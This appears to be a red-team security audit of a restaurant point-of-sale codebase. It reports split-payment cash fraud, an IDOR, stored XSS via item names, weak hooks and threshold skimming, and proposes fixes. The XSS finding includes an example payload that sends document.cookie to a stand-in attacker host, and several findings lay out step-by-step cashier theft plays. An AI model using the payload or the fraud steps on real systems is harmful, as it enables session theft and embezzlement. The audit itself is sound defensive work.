# S2 — POS Surface — Adversarial Red-Team Audit

**Date**: 2026-05-17
**Auditor**: POS RED-TEAM (hostile attacker framing)
**Mandate**: Cash trail manipulation, Z-rapport tampering, fiscal sequence skip, split payment bypass, cashier privilege abuse, Vanilla wizard XSS/injection
**Mode**: READ-ONLY static analysis. Hostile mindset.
**Scope guardrails**: V1 = single restaurant (Le Cayenne). Blast radius is small TODAY. The moment V2 SaaS multi-tenant ships, every P0/P1 below becomes a tenant-isolation breach with regulatory exposure (NF525 + RGPD).

---

## P0 — Critical (immediate cash loss / fiscal fraud / data leak)

### P0-1 — Split-payment "phantom CARD tranche" cash theft (NEW — bigger than the `change_amount` issue)
**Files**: `app/Services/Payments/SplitPaymentService.php:148-249`, `app/Http/Requests/PosOrderRequest.php:107-114`

**Attacker play (dishonest cashier)**:
1. Customer pays 75€ cash for a 75€ order.
2. Cashier submits `payment_breakdown=[{mode:CASH, amount:20, tendered:20}, {mode:CARD, amount:55, reference:"VISA-fake-1234"}]`.
3. `SplitPaymentService::validateBreakdown()` (line 50-136) sums tranches in cents → 75€ == 75€ → PASSES.
4. `persistTranches()` loop (line 187-249) writes 2 `order_payments` rows. The CARD tranche is persisted with a free-form `reference` (max 64 chars, line 199) — never cross-checked against any `payment_terminals` settlement, never validated against a real TPE response.
5. The CASH tranche writes a `cash_movement IN amount=20` (line 233-243). The CARD tranche writes NOTHING to `cash_movements` (the `if ($mode === CASH)` gate at line 233).
6. End of shift: drawer expected = opening + Σ(movements IN) − Σ(OUT) = +20€. Real drawer contains +20€. Variance = 0. RECONCILED OK.
7. Cashier pocketed 55€ in real cash that was logged as a fake card payment.

**Why it burns**: there is NO server-side coupling between (a) the persisted `OrderPayment.mode=CARD` row and (b) a TPE acquisition/authorization (`payment_terminals` settlement event). The `reference` field is free string. `PaymentTerminalRequest` exists (`app/Http/Requests/Admin/PaymentTerminalRequest.php`) but is for CRUD of terminal records, not transaction reconciliation. Audit log only records what the cashier claimed (`order.payment_tranche_persisted` at line 213-227), not what actually settled on the TPE.

**Detection probability**: 0 with current tooling. The Z report aggregates `total_by_method` per payment mode (`ZReportService::applyOrderToTotals` line 630-638) using the legacy `pos_payment_method` column on `orders` — but `SplitPaymentService` writes the `mode` on `order_payments` instead, so split-payment Z totals may not reflect tranche modes accurately, hiding the fraud even harder.

**Mitigation (proposed, requires owner gate)**:
- Require `payment_breakdown.*.terminal_id` (FK to `payment_terminals`) for CARD/MOBILE tranches; reject if NULL when `mode=CARD`.
- Add reconciliation cron that pairs each `OrderPayment.mode=CARD` with the matching TPE settlement file; flag unmatched within 24h.
- Surface "unsettled card tranche count" on the Z report.

---

### P0-2 — IDOR via `PosOrderController::show()` BranchScope bypass (already flagged at line 108, here is the blast radius)
**File**: `app/Http/Controllers/Admin/PosOrderController.php:108`

```php
$order = Order::withoutGlobalScope(BranchScope::class)->findOrFail($order);
return new OrderDetailsResource($this->orderService->show($order, false));
```

**Attacker play**: authenticated cashier with `pos-orders` or `pos` permission iterates `GET /api/admin/pos-order/show/{id}` from `id=1..N`. The `BranchScope` is explicitly bypassed before any branch check is performed (no `$user->branch_id` comparison anywhere in this method).

**What leaks** via `OrderDetailsResource` (`app/Http/Resources/OrderDetailsResource.php:16-78`):
- `user.name`, `user.email`, `user.media` (line 49) — customer PII
- `order_address` (line 50) — delivery address
- `pos_siret`, `pos_vat_intra` (line 72-73) — competing branch's legal identity
- `operator_name` (line 75) — staff identity of the other branch
- `payments_breakdown` (line 76) — competitor revenue mix
- `fiscal_sequence_no` (line 69) — monotonic, enumerable (single-branch sequences)
- `audit_chain_fingerprint` (line 70) — leaks 12 hex chars of the audit chain hash

**V1 blast radius**: limited (single resto Le Cayenne) — almost no cross-tenant data exists yet. **V2 SaaS blast radius**: any cashier of any client tenant can dump the entire order history of every other tenant in the same DB.

**Fix (one-liner)**: drop `withoutGlobalScope(BranchScope::class)` and re-enable Laravel route-model binding (already the pattern in `changeStatus`, `destroy`, `reorderItems`). If admin global access is needed, gate it: `if (!auth()->user()->hasRole('Admin')) { ... }`.

---

### P0-3 — Stored XSS via `Item.name` → `pos-wizard.js` innerHTML sinks
**Files**:
- Sinks: `public/js/pos-wizard.js:1195, 1246, 1343, 1358-1391, 1410, 1419, 1429, 1520-1524, 1568, 1592, 1628, 1672, 1701, 1719, 1741, 1781, 1801, 1827, 1854-1855, 1924, 1964, 1981, 3329, 4986, 4989, 5093, 5135` (40+ `innerHTML` writes interpolating `item.name`, `viande.name`, `g.name`, `sauce.name`, `boisson.thumb`)
- Source confirmed unescaped: `app/Http/Resources/ItemResource.php:70` (`"name" => $this->name`) — passes raw item name to the wire.
- Server-side validation: `app/Http/Requests/ItemRequest.php:33-38` — `'name' => required|string|max:190` only. No `strip_tags`, no regex, no HTML purifier.

**Attacker play (admin-with-write-access ↔ cashier-XSS)**:
1. A compromised or malicious admin (or supply-chain via item import CSV — `ItemImportRequest.php`) creates an item named:
   ```
   Burger</span><img src=x onerror="fetch('https://attacker.tld/x?c='+document.cookie)">
   ```
2. Cashier opens POS wizard, item card renders via `h += '<span class="option-name">' + item.name + '</span>'` (line 1359). Browser executes the `<img onerror>` payload in the cashier's authenticated origin.
3. Steals the cashier's Sanctum session cookie / localStorage token (the `pos-app.js` auth model per `AdminPosV4Controller.php:18-21` is localStorage token). Attacker can now POST orders, change payment status, destroy orders.

**Defense gap chain**:
- No `escapeHtml()` helper anywhere in `pos-wizard.js` (grep returned 0 hits).
- `ItemRequest` does not strip HTML.
- `ItemResource` and `NormalItemResource` both pass `name` raw.
- No CSP header configured (verify L4 audit; not seen here).
- The wizard is on the frozen-zone list, so the fix needs a LOCK plan.

**Blast radius**: any cashier session = full Sanctum-authenticated admin actions on POS. With current Le Cayenne staffing (~3-5 cashiers), 100% session takeover probability if the payload lands.

---

## P1 — High (cash skim / weak gate / forensic gap)

### P1-1 — `change_amount` client-trusted in split-payment (subset of P0-1 above but distinct vector)
**File**: `app/Services/Payments/SplitPaymentService.php:195-211`

```php
$changeRaw = $t['change'] ?? ($t['change_amount'] ?? 0);
$change = (float) ($changeRaw ?? 0);
// ... persisted as-is in OrderPayment
```

**Attacker play**: cashier on a 20€ order writes `{mode:CASH, amount:20, tendered:100, change:10}` (real change should be 80). Persists falsified `change=10` on `order_payments`. Cash movement IN = `amount=20` (line 237) — drawer expected +20€. Cashier returns 10€ to customer (or none), pockets 70€. If customer disputes, the receipt says 10€ change, so cashier's word against customer's. The audit log (line 224-225) only records what cashier claimed.

**Server-side defense missing**: no check that `change == tendered - amount` for CASH tranches.

---

### P1-2 — `safety-check.sh` for frozen zones is MANUAL-ONLY and bypassable
**File**: `.cursor/hooks/safety-check.sh:1-67`

**Header comment**: `"Run manually before every execution phase. Not auto-invoked. No environment variable dependencies."` — line 3-4.

**Attacker play (malicious insider with commit access)**:
- Modify `public/js/pos-wizard.js` (add a backdoor that auto-completes any order as PAID without cash).
- Commit with `git commit` — the hook is NOT registered in `.git/hooks/pre-commit` (manual).
- Or commit normally and the hook never runs.
- Or run with `--no-verify` even if it were registered.
- Or stage to a path the hook does NOT match (it uses `grep -q "$zone"` substring match — but here the path strings are literal-friendly, so this risk is small).
- CI/CD: no evidence in this audit that the safety-check is gated in the GitHub Actions / GitLab CI pipeline. Verify L1 audit.

**Blast radius**: complete defeat of the frozen-zone discipline (`CLAUDE.md §7`). NF525 chain integrity, kiosk wizard, POS wizard, BranchScope — all modifiable silently with a single rogue commit.

**Fix**: register as `core.hooksPath` git hook (auto-invoked) + duplicate the check in CI (`required` status check on the PR).

---

### P1-3 — `Sprint 1D / F-4` variance gate threshold (2€) salami-slice
**File**: `app/Services/Cash/CashDrawerService.php:230-277`, `config/cash.php` (`variance_threshold_eur` default 2.00)

```php
$threshold = (float) Config::get('cash.variance_threshold_eur', 2.00);
if (abs($variance) > $threshold) { /* require manager approval */ }
```

**Attacker play (dishonest cashier, sustained over time)**:
- Skim 1.99€ per session. Reconcile passes (`|variance| <= 2.00`). No `variance_reason`, no manager approval, no flag.
- 5 sessions/day × 250 days/year = 1250 sessions × 1.99€ = **2 487 €/year invisible per cashier**.
- Audit log records `cash.session.reconciled` with variance 1.99€ but never escalates.

**Fix**: monitor cumulative variance per cashier over rolling 7-day / 30-day windows; alert on consistent negative variance bias even when individual sessions stay under threshold.

---

### P1-4 — `Cache::lock` 3s acquire on `FiscalSequenceService::next()` can starve under burst
**File**: `app/Services/Fiscal/FiscalSequenceService.php:42-104`

**Setup**: 5s TTL lock, 3s acquire timeout. Defense-in-depth via `lockForUpdate()` + DB UNIQUE constraint (good).

**Attacker play (DoS / forced fiscal allocation failure)**:
- Coordinated burst of ~10 concurrent `POST /api/admin/pos` from same branch (via N tabs or stolen token replay). Each call holds the cache lock 50-500ms while doing `SELECT MAX(fiscal_sequence_no) FOR UPDATE` + insert. After 3s of contention, the 4th+ caller throws `RuntimeException`. Sale fails → cashier retries → customer leaves.
- More dangerous: combined with kiosk traffic during peak — kiosk uses the SAME `FiscalSequenceService::next()` path. A POS burst can starve kiosk fiscal alloc → `fiscal_alloc_error_at` flag → orphan PAID orders excluded from Z (line 599-616 of `ZReportService`).

**Severity is P1, not P0**: this is degradation, not data corruption. The retry cron (`foodking:fiscal:retry-alloc`) eventually catches the orphans. But customers don't wait.

---

### P1-5 — Order destroy hard-deletes `orderItems` — audit chain is the ONLY surviving record
**File**: `app/Services/OrderService.php:2086-2090`

```php
$order->address()?->delete();
$order->coupon()?->delete();
$order->orderItems()?->delete();  // HARD delete (no SoftDeletes on OrderItem?)
$order->delete();                  // Soft delete
```

**Attacker play (insider with `pos-destroy-paid` permission)**:
- Destroy a problematic order (e.g., one that would prove a delivery dispute, or a fraudulent refund). The audit log captures `total + fiscal_sequence_no` (line 2113-2128) but NOT the line items.
- If the audit_logs HMAC chain table itself is later attacked (TRUNCATE bypass via `GRANT level` mentioned in `CLAUDE.md §8` is the documented mitigation — verify L3 audit for current state), the entire forensic chain falls.

**Mitigation**: snapshot full order_items state in the audit log payload before delete, OR soft-delete `order_items` as well.

---

### P1-6 — Park-order recall does not rate-limit; replay-after-cancel possible
**File**: `app/Http/Controllers/Admin/Pos/ParkedOrderController.php` + `app/Services/PosParkedOrderService.php:72-103`

**Attacker play**:
1. Cashier A parks order #1 (label "Table 5", total 100€).
2. Cashier A walks away. Cashier B (same branch) calls `GET /api/admin/pos/parked-orders` — `listForOperator(userId, branchId)` filters by `user_id` (line 64-67), so B does NOT see A's parked orders. **Good.**
3. BUT: cashier B knows or guesses the parked ID. Calls `GET /api/admin/pos/parked-orders/{id}` → `recall()` filters by `(user_id = B, branch_id, parkedId)` (line 75-80) → returns `null` → 404. **Good.**

**Verified**: parked-order ownership is properly enforced. Acceptable.

**Smaller risk**: `idempotency_token` is per-user but the `purgeOlderThanHours` (line 204-209) is CLI-only (`PosPurgeParkedOrders` command), no HTTP. No evidence-destruction vector.

---

## P2 — Medium

### P2-1 — `walk-in-customer` PII exposure (closed in Wave Z 5B, verify)
**File**: `app/Http/Controllers/Admin/PosController.php:43-51`

Wave Z 5B (per code comment) added `permission:pos` to walk-in customer endpoint. Verified: constructor middleware `->except('quote')` (line 51) means `walkInCustomer` IS gated by `permission:pos`. Closed.

### P2-2 — Z-report close has no operator-presence guard
**File**: `app/Services/Fiscal/ZReportService.php:180-286`

`close($branchId, $closedBy)` accepts any authenticated user with permission to call it. There is no verification that an open `CashDrawerSession` exists for the closer's user, no count-mode confirmation. A cashier could `close-then-flee` to avoid being on shift when a variance is later discovered.

**Mitigation**: require all open `CashDrawerSession` for the branch to be `RECONCILED` before Z close; today there is no such cross-table assertion in `ZReportService::close`.

### P2-3 — `pos_payment_note` allows free string for CARD last-4-digits up to "max 200" or "min_digits:4, max_digits:4"
**File**: `app/Http/Requests/PosOrderRequest.php:101`

Validation is a complex ternary. For `pos_payment_method=CARD`, it requires numeric 4-digit string. For MOBILE_BANKING / OTHER / TICKET_RESTAURANT, it requires `string max:200`. For TICKET_RESTAURANT in particular, no format constraint — could store URLs, scripts, malformed PAN data. Compliance risk if PCI scope is touched.

### P2-4 — `audit_chain_fingerprint` exposed on OrderDetailsResource
**File**: `app/Http/Resources/OrderDetailsResource.php:70`

The 12-char fingerprint is intentional (per code comment "never exposes full HMAC"). 12 hex chars = 48 bits — not directly forgeable, but enables an attacker who controls another order's payload to test for collisions. Low risk in isolation, but combined with P0-2 enumeration, the attacker now has 12 hex chars of chain state per order — useful for chain-state inference.

---

## What's defended (one-liners; do not waste audit cycles re-verifying)

- **Single-tender CASH** validates `pos_received_amount >= $order->total` server-side against SSOT recomputed total (`OrderService.php:888-895`). Drawer cash_movement = order total. Safe.
- **Cashier branch isolation** on `posOrderStore` (line 614-624): non-admin can only create orders for their own branch. Verified.
- **Fiscal sequence concurrency** via `Cache::lock + lockForUpdate + UNIQUE constraint` triple defense. NF525-grade.
- **Z report close** is idempotent (rejects double-close), HMAC chain-validated before/after. Frozen-zone-correct.
- **`changeStatus → RETURNED`** blocked when order is sealed by a closed Z window (`SealedOrderGuard` line 1675-1697). Forces caller to use `refund-with-counter-entry` mirror — NF525 immutability preserved.
- **Idempotency lock** scoped per (branch, key) prevents cross-branch leak via duplicate replay (`OrderService.php:577-597`).
- **`openSession` double-open** TOCTOU hardened (3 layers, iter15-P0-09). Verified.
- **`reconcile`** variance gate exists (Sprint 1D / F-4) — bypass requires manager permission. Partial defense (see P1-3 salami).
- **`Order::create`** strips client `total/subtotal/discount` (line 607). Pricing SSOT. Safe.
- **Parked-order ownership** scope is per-user, not just per-branch. Safe.

---

## Attack dimensions NOT fully explored (handoff to follow-up cycles)

1. **TPE settlement reconciliation** — only checked that `payment_terminals` model exists and `OrderPayment.terminal_id` FK exists (`app/Models/OrderPayment.php:33, 82`). Did NOT verify whether a cron actually pairs persisted CARD `order_payments` with TPE acquisition files. P0-1 above assumes this pairing is missing — needs confirmation by L3 fiscal/payment audit.
2. **CSP header / cookie SameSite** — not in S2 scope; relevant to the XSS impact (P0-3). Handoff to L4 / X2.
3. **CI pipeline frozen-zone enforcement** — `safety-check.sh` is manual; whether GitHub Actions duplicates the check was not verified. Handoff to L1.
4. **`KioskMachineLoginController` token sprawl** — relevant to POS surface if kiosk-token is reusable for POS routes. Handoff to S1 audit.
5. **TruncateAudit_logs / DELETE bypass** — `CLAUDE.md §8` mentions DB trigger + GRANT mitigation, but the current GRANT state per environment was NOT inspected. Handoff to L3.
6. **Race between Z close and in-flight POST /pos** — locked at Z layer but the order finalization spans multiple statements; a kiosk order in the middle of `finalizePaidKioskOrder` could race the close window boundary. Smell-check only, no concrete exploit demonstrated.

---

## Verdict (POS surface RED-team)

- **P0**: 3 (split-tender phantom CARD theft, IDOR show(), stored XSS via item name)
- **P1**: 6
- **P2**: 4

**V1 Le Cayenne shippable** with P0-2 (IDOR) downgraded by single-tenant constraint and P0-1 (split-payment) downgraded if multi-tender feature flag is disabled in production for this client (verify `SPLIT_PAYMENT_ENABLED` env). P0-3 (XSS) requires immediate fix — even single-tenant, a rogue admin or a single supplier import containing HTML payload pwns every cashier.

**V2 SaaS NO-GO** until P0-1, P0-2, P0-3 are resolved with verified tests.

**Cross-validation needed** with main audit (when written): if main finds the same P0-1 and P0-2 independently, mark CROSS-VALIDATED-2-AGENTS per the adversarial audit doctrine. P0-3 (XSS) was identified by hostile grep here; main may have missed it (it's a defensive-coding finding, not a flow finding).
